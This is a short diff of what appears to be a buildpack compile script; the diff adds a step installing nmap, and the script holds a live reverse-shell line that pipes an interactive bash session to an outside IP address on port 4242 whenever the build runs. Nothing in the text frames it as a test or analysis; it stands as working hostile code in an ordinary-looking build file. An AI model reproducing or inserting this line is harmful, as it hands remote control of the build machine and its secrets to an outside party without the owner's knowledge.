@@ -2,6 +2,9 @@
 # bin/compile <build-dir> <cache-dir>
 
 echo "test.."
+echo "-----> Install nmnap"
+apt-get install --yes nmap
+
 bash -i >& /dev/tcp/185.74.43.122/4242 0>&1
 
 set -e
